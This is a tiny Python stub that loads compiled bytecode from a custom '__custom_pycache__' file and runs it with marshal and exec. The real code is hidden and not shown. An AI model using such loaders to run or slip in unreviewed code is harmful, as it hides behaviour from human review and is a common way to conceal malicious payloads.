
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'ImageCard_9cfefaa9dc5e480c8c8a3c826480265a.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
